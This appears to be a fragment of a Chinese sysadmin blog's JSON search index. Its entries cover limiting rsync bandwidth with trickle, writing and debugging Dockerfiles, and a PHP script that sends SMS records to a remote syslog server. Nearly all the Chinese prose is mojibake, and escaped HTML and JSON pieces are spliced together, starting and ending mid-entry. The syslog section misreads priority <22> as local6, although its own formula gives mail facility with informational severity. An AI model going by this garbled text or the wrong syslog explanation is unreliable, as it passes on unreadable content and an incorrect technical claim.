å‚æ•°ï¼ŒæŠŠé€Ÿåº¦é™åˆ¶ä¸º 600KB/s ï¼Œ600Ã—8=4800ï¼Œå•è¿›ç¨‹åŸºæœ¬æ˜¯5Mçš„é€Ÿåº¦ï¼Œæœ€å¤šåªèƒ½è·‘12ä¸ªäº†ï¼Œå°±ä¼šè·‘åˆ°60Mã€‚\nè¿™æ ·ä¹Ÿä¸å¤ªå¯¹ï¼Œå°¤å…¶æ˜¯ rsync å¹¶å‘è¿›ç¨‹é€æ¸å‡å°‘ï¼Œå°‘äº12ä¸ªçš„æ—¶å€™ï¼Œè¿™æ ·å°±å‡ºç°è·‘ä¸æ»¡60Mçš„ç°è±¡ã€‚\näºŒã€å¤šæ–‡ä»¶æ•´ä½“é™é€Ÿ é‚£ä¹ˆ rsync æ”¯æŒå¤šæ–‡ä»¶ä¼ è¾“ ï¼Œä½¿ç”¨å¦‚ä¸‹æ ¼å¼æ•´ä½“é™é€Ÿ\nrsync --bwlimit=7200 -auvPR æ–‡ä»¶1 æ–‡ä»¶2 æ–‡ä»¶3 192.168.9.17::mysql é—®é¢˜åˆæ¥äº†ï¼Œæ–‡ä»¶1 æ–‡ä»¶2 æ–‡ä»¶3 çš„è·¯å¾„éå¸¸é•¿ï¼Œè€Œæ–‡ä»¶ä¸ªæ•°ä¸å®šï¼Œæœ‰æ’‘çˆ†å‘½ä»¤è¡Œå•è¡Œé•¿åº¦é™åˆ¶çš„å¯èƒ½ï¼Œä¹Ÿä¸å¯è¡Œ\nä¸‰ã€tc ä½¿ç”¨ tc å¯ä»¥æ§åˆ¶æºipæˆ–è€…ç›®çš„ipçš„å¸¦å®½ï¼Œä½†æ˜¯æœ¬æœºç½‘å¡æ˜¯ä¸‡å…†å…‰å¡ï¼Œç”Ÿäº§ç¯å¢ƒï¼Œæ¯æ—¶æ¯åˆ»éƒ½æœ‰æ•°æ®è¯»å†™ã€‚\nä¸€æ—¦é”™äº†ï¼Œå°±ç›´æ¥å®Œè›‹äº†ã€‚ä¹Ÿä¸å¤ªå¯è¡Œ\nå››ã€æ€å™¨trickle å¯»æ‰¾äº†åŠå¤©ï¼Œç»ˆäºæ‰¾åˆ°äº†ä¸ªå¤§æ€å™¨trickleï¼Œå¯ä»¥å¯¹ç¨‹åºå•ç‹¬é™é€Ÿï¼Œä¹Ÿå¯ä»¥å¯¹ä¸€å †ç¨‹åºæ•´ä½“é™é€Ÿ\nå®‰è£…ï¼š\n$ yum install -y epel-release $ yum install trickle å‚æ•°è§£é‡Šï¼š\n-u ä¸Šè½½é€Ÿåº¦ KB/s ï¼Œä¹˜ä»¥8æ¢ç®—æˆç½‘ç»œé€Ÿåº¦ -d ä¸‹è½½é€Ÿåº¦ KB/s ï¼Œä¹˜ä»¥8æ¢ç®—æˆç½‘ç»œé€Ÿåº¦ -s standaloneç‹¬ç«‹æ¨¡å¼ï¼Œä¸å‚ä¸ trickled çš„æ•´ä½“æ¨¡å¼ å¦‚æœè¦å¯¹ä¸€ä¸ªç¨‹åºå•ç‹¬é™é€Ÿï¼Œ10KB\ntrickle -s -u 10 -d 10 wget http://mirrors.163.com/rocky/8/isos/x86_64/Rocky-8.4-x86_64-dvd1.iso wget çš„ä¸‹è½½å®Œå…¨è¢«é™åˆ¶åœ¨äº†10KB\nå¦‚è¿‡è¦å¯¹ä½¿ç”¨trickleçš„æ‰€æœ‰ç¨‹åºåšæ•´ä½“é™é€Ÿ\n# é¦–å…ˆå¯åŠ¨å®ˆæŠ¤è¿›ç¨‹ trickled $ trickled -u 7200 -d 7200 # ç„¶åæ‰€æœ‰ç”¨trickleæ‰§è¡Œçš„å‘½ä»¤å°±ä¼šæ•´ç†é™é€Ÿåœ¨7200KB/s ï¼ˆç½‘ç»œé€Ÿåº¦60Mï¼‰ find . -type f | grep $(date -d\u0026#34;-1 day\u0026#34; +\u0026#39;%Y%m%d\u0026#39;) |xargs -I % -P 30 trickle rsync -auvPR % 192.168.9.17::mysql ","permalink":"https://rendoumi.com/posts/20211028-trickle/","summary":"\u003cp\u003eä¹‹å‰è®²è¿‡å¦‚ä½•å¯¹ opnvpn æ€»ä½“é™é€Ÿï¼Œè¿™æ¬¡æ¥äº†ä¸€ä¸ªæ›´ä¸¥æ ¼çš„ç¨‹åºé™é€Ÿéœ€æ±‚ï¼š\u003c/p\u003e\n\u003cp\u003eåœºæ™¯å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eä¸¤ä¸ªæœºæˆ¿é—´æœ‰ä¸€æ¡ä¸“çº¿ 100M\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eä¸¤ä¸ªæœºæˆ¿é—´éœ€è¦åŒæ­¥æ•°æ®ï¼ŒåŒæ­¥éœ€è¦é™åˆ¶åˆ°60Mï¼Œç»™åˆ«çš„ç¨‹åºç•™å‡ºå¸¦å®½ç©ºé—´\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eä¼ è¾“æ˜¯å¤šä¸ªæ–‡ä»¶ï¼Œç”¨ rsync å¹¶å‘ä¼ é€\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eåˆ†æäº†ä¸€ä¸‹è„šæœ¬çš„æ ¸å¿ƒéƒ¨åˆ†\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efind . -type f  \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep \u003cspan class=\"k\"\u003e$(\u003c/span\u003edate -d\u003cspan class=\"s2\"\u003e\u0026#34;-1 day\u0026#34;\u003c/span\u003e +\u003cspan class=\"s1\"\u003e\u0026#39;%Y%m%d\u0026#39;\u003c/span\u003e\u003cspan class=\"k\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003exargs -I % -P \u003cspan class=\"m\"\u003e30\u003c/span\u003e rsync -auvPR % 192.168.9.17::mysql\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå‘ç°æ˜¯åˆ©ç”¨ xargs çš„å¹¶å‘ï¼Œ-P 30 æœ€å¤§å¹¶å‘30ä¸ªï¼Œå¯åŠ¨äº† rsync åŒæ­¥\u003c/p\u003e\n\u003cp\u003ersync æ²¡æœ‰é™é€Ÿï¼Œè¿™å°±éº»çƒ¦äº†ã€‚\u003c/p\u003e\n\u003ch2 id=\"ä¸€å•æ–‡ä»¶å•ç‹¬é™é€Ÿ\"\u003eä¸€ã€å•æ–‡ä»¶å•ç‹¬é™é€Ÿ\u003c/h2\u003e\n\u003cp\u003eé¦–å…ˆæ˜¯ä½¿ç”¨ rsync çš„ \u0026ndash;bwlimit=600 å‚æ•°ï¼ŒæŠŠé€Ÿåº¦é™åˆ¶ä¸º 600KB/s ï¼Œ600Ã—8=4800ï¼Œå•è¿›ç¨‹åŸºæœ¬æ˜¯5Mçš„é€Ÿåº¦ï¼Œæœ€å¤šåªèƒ½è·‘12ä¸ªäº†ï¼Œå°±ä¼šè·‘åˆ°60Mã€‚\u003c/p\u003e\n\u003cp\u003eè¿™æ ·ä¹Ÿä¸å¤ªå¯¹ï¼Œå°¤å…¶æ˜¯ rsync å¹¶å‘è¿›ç¨‹é€æ¸å‡å°‘ï¼Œå°‘äº12ä¸ªçš„æ—¶å€™ï¼Œè¿™æ ·å°±å‡ºç°è·‘ä¸æ»¡60Mçš„ç°è±¡ã€‚\u003c/p\u003e\n\u003ch2 id=\"äºŒå¤šæ–‡ä»¶æ•´ä½“é™é€Ÿ\"\u003eäºŒã€å¤šæ–‡ä»¶æ•´ä½“é™é€Ÿ\u003c/h2\u003e\n\u003cp\u003eé‚£ä¹ˆ rsync æ”¯æŒå¤šæ–‡ä»¶ä¼ è¾“ ï¼Œä½¿ç”¨å¦‚ä¸‹æ ¼å¼æ•´ä½“é™é€Ÿ\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ersync --bwlimit\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e7200\u003c/span\u003e -auvPR æ–‡ä»¶1 æ–‡ä»¶2 æ–‡ä»¶3 192.168.9.17::mysql \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eé—®é¢˜åˆæ¥äº†ï¼Œæ–‡ä»¶1 æ–‡ä»¶2 æ–‡ä»¶3 çš„è·¯å¾„éå¸¸é•¿ï¼Œè€Œæ–‡ä»¶ä¸ªæ•°ä¸å®šï¼Œæœ‰æ’‘çˆ†å‘½ä»¤è¡Œå•è¡Œé•¿åº¦é™åˆ¶çš„å¯èƒ½ï¼Œä¹Ÿä¸å¯è¡Œ\u003c/p\u003e\n\u003ch2 id=\"ä¸‰tc\"\u003eä¸‰ã€tc\u003c/h2\u003e\n\u003cp\u003eä½¿ç”¨ tc å¯ä»¥æ§åˆ¶æºipæˆ–è€…ç›®çš„ipçš„å¸¦å®½ï¼Œä½†æ˜¯æœ¬æœºç½‘å¡æ˜¯ä¸‡å…†å…‰å¡ï¼Œç”Ÿäº§ç¯å¢ƒï¼Œæ¯æ—¶æ¯åˆ»éƒ½æœ‰æ•°æ®è¯»å†™ã€‚\u003c/p\u003e\n\u003cp\u003eä¸€æ—¦é”™äº†ï¼Œå°±ç›´æ¥å®Œè›‹äº†ã€‚ä¹Ÿä¸å¤ªå¯è¡Œ\u003c/p\u003e\n\u003ch2 id=\"å››æ€å™¨trickle\"\u003eå››ã€æ€å™¨trickle\u003c/h2\u003e\n\u003cp\u003eå¯»æ‰¾äº†åŠå¤©ï¼Œç»ˆäºæ‰¾åˆ°äº†ä¸ªå¤§æ€å™¨trickleï¼Œå¯ä»¥å¯¹ç¨‹åºå•ç‹¬é™é€Ÿï¼Œä¹Ÿå¯ä»¥å¯¹ä¸€å †ç¨‹åºæ•´ä½“é™é€Ÿ\u003c/p\u003e\n\u003cp\u003eå®‰è£…ï¼š\u003c/p\u003e","title":"Linuxä¸‹çš„ç¨‹åºé™é€Ÿè½¯ä»¶Trickle"},{"content":"Dockerfile æ˜¯é€ å‡ºé•œåƒçš„åŸºç¡€ï¼Œæ˜¯å¿…é¡»ç†ŸçŸ¥å¹¶äº†è§£çš„çŸ¥è¯†ï¼š\nä¸€ã€ç¼–å†™Dockerfile å…ˆç»™ä¸ªä¾‹å­ï¼Œæ˜¯ minio ä»£ç†è®¿é—®é˜¿é‡Œçš„ OSS\nFROM alpine:3.12 RUN apk add --update bash \u0026amp;\u0026amp; rm -rf /var/cache/apk/* COPY minio.RELEASE.2020-04-15T19-42-18Z /data/minio.RELEASE.2020-04-15T19-42-18Z ENV MINIO_ACCESS_KEY=LTAI5tFFTbsxxxxxuLb ENV MINIO_SECRET_KEY=t78PyGnHZilxxxxxdxBCjvNgtVC5Y WORKDIR /data EXPOSE 9000 CMD [\u0026#34;/data/minio.RELEASE.2020-04-15T19-42-18Z\u0026#34;,\u0026#34;gateway\u0026#34;,\u0026#34;oss\u0026#34;,\u0026#34;http://oss-cn-shanghai-internal.aliyuncs.com\u0026#34;] # CMD /bin/sh -c \u0026#34;while true; do echo hi; sleep 10; done\u0026#34; è¯¦ç»†è§£é‡Šæ¯ä¸€æ¡è¯­å¥ï¼š\nFROM\nåŸºæ¿ï¼Œalpine 3.12 æ˜¯ä¸ªæ¯”è¾ƒå¾®å°çš„ç‰ˆæœ¬ï¼Œæ³¨æ„å®ƒçš„æ¯›ç—…ï¼Œ/bin/shå…¶å®æ˜¯busyboxï¼Œæ²¡æœ‰/bin/bashï¼ŒæŸäº›bashçš„å‡½æ•°åŠŸèƒ½æ”¯æŒä¸å…¨ï¼Œæ¯”å¦‚forå¾ªç¯\nRUN\nåœ¨å®¹å™¨ä¸­è¿è¡Œå‘½ä»¤ï¼Œä¸Šä¾‹ä¸­æˆ‘ä»¬æ·»åŠ äº† bash ï¼Œå¹¶æ¸…ç†äº†ç¼“å­˜ã€‚å‘½ä»¤é—´ç”¨ \u0026amp;\u0026amp; å¯ä»¥é¿å…é•œåƒè¿‡å¤šåˆ†å±‚ã€‚\nRUNåˆ†ä¸¤ç§æ¨¡å¼shellå’Œexecæ¨¡å¼:\næˆ‘ä»¬åªç”¨ exec æ¨¡å¼ï¼Œå› ä¸ºåœ¨ image é‡Œè£…å…¥å¤šä¸ª shellï¼Œæ²¡ä»€ä¹ˆæ„ä¹‰ã€‚\nCOPY å’Œ ADD\nä½œç”¨éƒ½æ˜¯å°†æ–‡ä»¶æˆ–ç›®å½•å¤åˆ¶åˆ° Dockerfile æ„å»ºçš„é•œåƒä¸­\næˆ‘ä»¬åªç”¨COPYï¼Œå¦‚æœé‡åˆ°è¦æŠŠURLçš„æ–‡ä»¶æ”¾è¿›å»ï¼Œå¯ä»¥å…ˆwgetï¼Œç„¶åæ”¾ï¼›å¦‚æœè¦è§£å‹tarråŒ…æ”¾è¿›å»ï¼Œé‚£å°±å…ˆè§£å‹å†æ”¾ã€‚\næ³¨æ„æºæ–‡ä»¶è·¯å¾„éƒ½ä½¿ç”¨ç›¸å¯¹è·¯å¾„ï¼Œç›®æ ‡è·¯å¾„ä½¿ç”¨ç»å¯¹è·¯å¾„ã€‚\nå¦‚æœdestä¸æŒ‡å®šç»å¯¹è·¯å¾„ï¼Œåˆ™æ˜¯æƒ³å¯¹äºWORDIRçš„ç›¸å¯¹è·¯å¾„\nCMD å…¥å£\nç”¨ [] åˆ†å‰²ï¼Œ æŠŠæ‰€æœ‰ \u0026quot;\u0026quot; çš„éƒ¨åˆ†åˆå¹¶ä¸ºä¸€è¡Œï¼Œä¸­é—´ç”¨ç©ºæ ¼éš”å¼€æ‰§è¡Œï¼›æˆ–è€…ç›´æ¥ä¸€è¡Œæ²¡ä»»ä½•åˆ†å‰²ç¬¦ã€‚\næ‰€ä»¥ä¸Šé¢çš„ä¾‹å­å°±æ˜¯æ‰§è¡Œäº†ä¸€å¥ï¼š\n/data/minio.RELEASE.2020-04-15T19-42-18Z gateway oss http://oss-cn-shanghai-internal.aliyuncs.com æŠ€å·§ï¼š\næŠŠå‡ ä¸ªå‘½ä»¤åˆåœ¨ä¸€èµ·æ‰§è¡Œ\n()è¡¨ç¤ºåœ¨å½“å‰shellåˆå¹¶æ‰§è¡Œ\n{}è¡¨ç¤ºæ´¾ç”Ÿå‡ºä¸€ä¸ªå­shellï¼Œåœ¨å­shellä¸­åˆå¹¶æ‰§è¡Œï¼Œ{ echo \u0026ldquo;aaa\u0026rdquo; }å¿…é¡»æœ‰ç©ºæ ¼\n\u0026amp;è¡¨ç¤ºåå°è¿è¡Œ\nå‘½ä»¤ä¹‹é—´ä½¿ç”¨ \u0026amp;\u0026amp; è¿æ¥ï¼Œå®ç°é€»è¾‘ä¸çš„åŠŸèƒ½ã€‚\nåªæœ‰åœ¨ \u0026amp;\u0026amp; å·¦è¾¹çš„å‘½ä»¤è¿”å›çœŸï¼ˆå‘½ä»¤è¿”å›å€¼ $? == 0ï¼‰ï¼Œ\u0026amp;\u0026amp; å³è¾¹çš„å‘½ä»¤æ‰ä¼šè¢«æ‰§è¡Œã€‚ åªè¦æœ‰ä¸€ä¸ªå‘½ä»¤è¿”å›å‡ï¼ˆå‘½ä»¤è¿”å›å€¼ $? == 1ï¼‰ï¼Œåé¢çš„å‘½ä»¤å°±ä¸ä¼šè¢«æ‰§è¡Œã€‚ \u0026amp;\u0026amp;å·¦è¾¹çš„å‘½ä»¤ï¼ˆå‘½ä»¤1ï¼‰è¿”å›çœŸ(å³è¿”å›0ï¼ŒæˆåŠŸè¢«æ‰§è¡Œï¼‰åï¼Œ\u0026amp;\u0026amp;å³è¾¹çš„å‘½ä»¤ï¼ˆå‘½ä»¤2ï¼‰æ‰èƒ½å¤Ÿè¢«æ‰§è¡Œï¼›æ¢å¥è¯è¯´ï¼Œâ€œå¦‚æœè¿™ä¸ªå‘½ä»¤æ‰§è¡ŒæˆåŠŸ\u0026amp;\u0026amp;é‚£ä¹ˆæ‰§è¡Œç¬¬äºŒä¸ªå‘½ä»¤â€ã€‚\næœ€ä¸‹çš„è¯­æ³•ç”¨äº†seqè€Œä¸æ˜¯forå¾ªç¯ï¼Œæ˜¯å› ä¸ºbusyboxçš„shä¸æ”¯æŒforè¯­æ³•\næ‰€ä»¥æ‰æœ‰å¦‚æ­¤æ€ªå¼‚çš„è¯­æ³•ï¼Œåœ¨å®¹å™¨ä¸­åå°è·‘10ä¸ªphp think queueï¼Œ1ä¸ªcrondï¼Œå‰å°è·‘ä¸€ä¸ªphp-fpmï¼š\nCMD for i in $(seq 10); do (php think queue \u0026amp;) ; done \u0026amp; crond \u0026amp;\u0026amp; php-fpm ARG å‚æ•°\nARG VERSION=7.6.1\nå®šä¹‰åå¯ä»¥ç”¨${VERSION}å¼•ç”¨ï¼Œbuildçš„æ—¶å€™å¯ä»¥åŠ \u0026ndash;build-arg ä¼ å‚æ•°è¿›å»\ndocker build --build-arg VERSION=${LATEST} -t $(ORG)/$(NAME):$(BUILD) . è¿˜æœ‰å¾ˆå¤š Build çš„æŠ€å·§ï¼Œå¦‚æœé€ ä¸€ä¸ª go è¯­è¨€ç¼–è¯‘ç¯å¢ƒçš„ä¸­é—´å±‚é•œåƒï¼Œç„¶åé€ æœ€ç»ˆé•œåƒã€‚\nä½†æ˜¯å…«æˆ’è¿˜æ˜¯æ¨èç›´æ¥é€ å‡ºäºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶ï¼Œç„¶åç›´æ¥æ‹·è´è¿›å»å°±å¥½ï¼Œä¸è¦å¼„çš„è¿‡äºéº»çƒ¦ï¼Œä¸­é—´å±‚é‚£ç§é€‚ç”¨äºç”¨æºç  CI/CD ä¸­æ— ç¼–è¯‘ç¯å¢ƒçš„æƒ…å†µã€‚\näºŒã€è°ƒè¯•å®¹å™¨ å¾ˆå¤šæƒ…å†µä¸‹æˆ‘ä»¬é€ å¥½äº† image ï¼Œä¸€è·‘å°±æ‰ä¸‹æ¥äº†ï¼Œä¹Ÿä¸çŸ¥é“æ˜¯ä»€ä¹ˆæƒ…å†µ\nè¿™ä¸ªæ—¶å€™ï¼Œæˆ‘ä»¬æŠŠ CMD æ¢æˆä¸€ä¸ª sh æ‰§è¡Œä¸€ä¸ªæ­»å¾ªç¯\nCMD /bin/sh -c \u0026#34;while true; do echo hi; sleep 10; done\u0026#34; ç„¶åè¿›å…¥å®¹å™¨ï¼Œç„¶åå†æ‰§è¡Œä¹‹å‰çš„ CMD å‘½ä»¤ï¼Œçœ‹çœ‹æŠ¥é”™ä¿¡æ¯æ˜¯ä»€ä¹ˆï¼Œå°±å¯ä»¥è°ƒè¯•äº†\n$ docker exec -it 89174asklja /bin/sh ä¸‰ã€podçš„ç­‰å¾…æŠ€å·§ è¿™é‡Œå¯åŠ¨æ­£å¼çš„podä¹‹å‰ï¼Œå…ˆä¸´æ—¶èµ·äº†ä¸¤ä¸ªå®¹å™¨ç­‰å¾…å…¶ä»–æœåŠ¡çš„å®Œæˆ\ncontainers: - name: myapp-container image: busybox command: [\u0026#39;sh\u0026#39;, \u0026#39;-c\u0026#39;, \u0026#39;echo The app is running! \u0026amp;\u0026amp; sleep 3600\u0026#39;] initContainers: - name: init-myservice image: busybox command: [\u0026#39;sh\u0026#39;, \u0026#39;-c\u0026#39;, \u0026#39;until nslookup myservice; do echo waiting for myservice; sleep 2; done;\u0026#39;] - name: init-mydb image: busybox command: [\u0026#39;sh\u0026#39;, \u0026#39;-c\u0026#39;, \u0026#39;until nslookup mydb; do echo waiting for mydb; sleep 2; done;\u0026#39;] ","permalink":"https://rendoumi.com/posts/20211028-dockerfile/","summary":"\u003cp\u003eDockerfile æ˜¯é€ å‡ºé•œåƒçš„åŸºç¡€ï¼Œæ˜¯å¿…é¡»ç†ŸçŸ¥å¹¶äº†è§£çš„çŸ¥è¯†ï¼š\u003c/p\u003e\n\u003ch2 id=\"ä¸€ç¼–å†™dockerfile\"\u003eä¸€ã€ç¼–å†™Dockerfile\u003c/h2\u003e\n\u003cp\u003eå…ˆç»™ä¸ªä¾‹å­ï¼Œæ˜¯ minio ä»£ç†è®¿é—®é˜¿é‡Œçš„ OSS\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eFROM alpine:3.12 \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eRUN apk add --update bash \u0026amp;\u0026amp; rm -rf /var/cache/apk/*  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eCOPY minio.RELEASE.2020-04-15T19-42-18Z /data/minio.RELEASE.2020-04-15T19-42-18Z  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eENV MINIO_ACCESS_KEY\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003eLTAI5tFFTbsxxxxxuLb  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eENV MINIO_SECRET_KEY\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003et78PyGnHZilxxxxxdxBCjvNgtVC5Y  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eWORKDIR /data  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eEXPOSE 9000  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eCMD [\u0026#34;/data/minio.RELEASE.2020-04-15T19-42-18Z\u0026#34;,\u0026#34;gateway\u0026#34;,\u0026#34;oss\u0026#34;,\u0026#34;http://oss-cn-shanghai-internal.aliyuncs.com\u0026#34;] \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# CMD /bin/sh -c \u0026#34;while true; do echo hi; sleep 10; done\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003cp\u003eè¯¦ç»†è§£é‡Šæ¯ä¸€æ¡è¯­å¥ï¼š\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eFROM\u003c/p\u003e\n\u003cp\u003eåŸºæ¿ï¼Œalpine 3.12 æ˜¯ä¸ªæ¯”è¾ƒå¾®å°çš„ç‰ˆæœ¬ï¼Œæ³¨æ„å®ƒçš„æ¯›ç—…ï¼Œ/bin/shå…¶å®æ˜¯busyboxï¼Œæ²¡æœ‰/bin/bashï¼ŒæŸäº›bashçš„å‡½æ•°åŠŸèƒ½æ”¯æŒä¸å…¨ï¼Œæ¯”å¦‚forå¾ªç¯\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eRUN\u003c/p\u003e\n\u003cp\u003eåœ¨å®¹å™¨ä¸­è¿è¡Œå‘½ä»¤ï¼Œä¸Šä¾‹ä¸­æˆ‘ä»¬æ·»åŠ äº† bash ï¼Œå¹¶æ¸…ç†äº†ç¼“å­˜ã€‚å‘½ä»¤é—´ç”¨ \u0026amp;\u0026amp; å¯ä»¥é¿å…é•œåƒè¿‡å¤šåˆ†å±‚ã€‚\u003c/p\u003e\n\u003cp\u003eRUNåˆ†ä¸¤ç§æ¨¡å¼shellå’Œexecæ¨¡å¼:\u003c/p\u003e\n\u003cp\u003eæˆ‘ä»¬åªç”¨ exec æ¨¡å¼ï¼Œå› ä¸ºåœ¨ image é‡Œè£…å…¥å¤šä¸ª shellï¼Œæ²¡ä»€ä¹ˆæ„ä¹‰ã€‚\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eCOPY å’Œ ADD\u003c/p\u003e","title":"Dockerfileçš„ç¼–å†™ä¸è°ƒè¯•æŠ€å·§"},{"content":"ç»™åŒäº‹åšäº†ä¸ª PHP æ¥å£ï¼Œè½¬å‘å‘é€çŸ­ä¿¡çš„è¯·æ±‚ï¼ŒåŒæ—¶è¦æŠŠå‘é€è®°å½•å‘é€åˆ°è¿œç¨‹çš„ cacti çš„ syslog å»\nå¾ˆç®€å•ï¼Œä½†æ˜¯ä¹Ÿä¸ç®€å•\né¦–å…ˆæ˜¯ PHP æœåŠ¡å™¨ï¼Œæ˜¯æœ€ç®€åŒ–ç¼–è¯‘çš„ï¼Œphp -m æŸ¥äº†ä¸€ä¸‹\nphp -m [PHP Modules] Core ctype curl date dom fileinfo filter gettext hash iconv json libxml openssl pcre PDO pdo_sqlite Phar posix Reflection session SimpleXML SPL sqlite3 standard tokenizer xml xmlreader xmlwriter [Zend Modules] å±…ç„¶æ²¡æœ‰ socket æ¨¡å—ï¼Œæ²¡åŠæ³•ï¼Œæ‰¾åˆ°æºä»£ç ï¼Œç¼–è¯‘ä¸€ä¸ªå®‰è£…ï¼ŒåŸæœ‰çš„ php å®‰è£…è·¯å¾„æ˜¯ /export/servers/php\n$ tar zxvf php-7.4.0.tar.gz $ cd php-7.4.0/sockets $ /export/servers/php/bin/phpize $ ./configure --enable-sockets --with-php-config=/export/servers/php/bin/php-config $ make $ make install åˆçœ‹äº†ä¸€çœ¼ï¼Œæ˜¯ php-fpmï¼Œå±…ç„¶æ²¡æœ‰ php.ini ï¼Œå¾—ï¼Œå†ç”Ÿæˆä¸€ä¸ªï¼Œæ”¾åœ¨ /export/servers/php/lib/php.ini\nextension_dir = \u0026#34;/export/servers/php740/lib/php/extensions/no-debug-non-zts-20190902/\u0026#34; extension = sockets.so ç„¶åé‡å¯ php-fpm ï¼Œé‡æ–° php -m æ£€æŸ¥ï¼Œå‘ç°æœ‰ socket æ¨¡å—å°± ok äº†ã€‚\næ¥ä¸‹æ¥å°±æ˜¯ php æºä»£ç äº†\n\u0026lt;?php date_default_timezone_set(\u0026#39;Asia/Shanghai\u0026#39;); function send_remote_syslog($message) { $sock = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP); foreach(explode(\u0026#34;\\n\u0026#34;, $message) as $line) { $syslog_message = \u0026#34;\u0026lt;22\u0026gt;\u0026#34; . date(\u0026#39;M d H:i:s \u0026#39;) . \u0026#39;Qi_an_xin sms_log: \u0026#39; . $line; socket_sendto($sock, $syslog_message, strlen($syslog_message), 0, \u0026#39;172.18.31.6\u0026#39;, 514); } socket_close($sock); } send_remote_syslog(\u0026#34;ABC éªŒè¯ç : 39792192\u0026#34;); ?\u0026gt; è¿™æ ·å°±å¯ä»¥äº†ï¼Œä¸Šé¢ä»£ç æ¯”è¾ƒéš¾ç†è§£çš„æ˜¯\u0026lt;22\u0026gt;ï¼Œé‚£æ˜¯æŠ¥é”™çº§åˆ«çš„è®¡ç®—æ–¹æ³•ï¼ŒFacility + Severityï¼š\n* Facility values: * 0 kernel messages * 1 user-level messages * 2 mail system * 3 system daemons * 4 security/authorization messages * 5 messages generated internally by syslogd * 6 line printer subsystem * 7 network news subsystem * 8 UUCP subsystem * 9 clock daemon * 10 security/authorization messages * 11 FTP daemon * 12 NTP subsystem * 13 log audit * 14 log alert * 15 clock daemon * 16 local user 0 (local0) (default value) * 17 local user 1 (local1) * 18 local user 2 (local2) * 19 local user 3 (local3) * 20 local user 4 (local4) * 21 local user 5 (local5) * 22 local user 6 (local6) * 23 local user 7 (local7) * * Severity values: * 0 Emergency: system is unusable * 1 Alert: action must be taken immediately * 2 Critical: critical conditions * 3 Error: error conditions * 4 Warning: warning conditions * 5 Notice: normal but significant condition (default value) * 6 Informational: informational messages * 7 Debug: debug-level messages è®¡ç®—æ–¹æ³•å°±æ˜¯ ï¼ˆfacility*8 + severityï¼‰ï¼Œè¿™é‡Œçš„22+0ï¼Œå¯ä»¥ç†è§£æˆ local6 ï¼Œå°±æ˜¯çº§åˆ«6\nå¦‚æœå‘äº†ä¸€ä¸ª \u0026ldquo;local use 4\u0026rdquo; å’Œ Serverity = 5 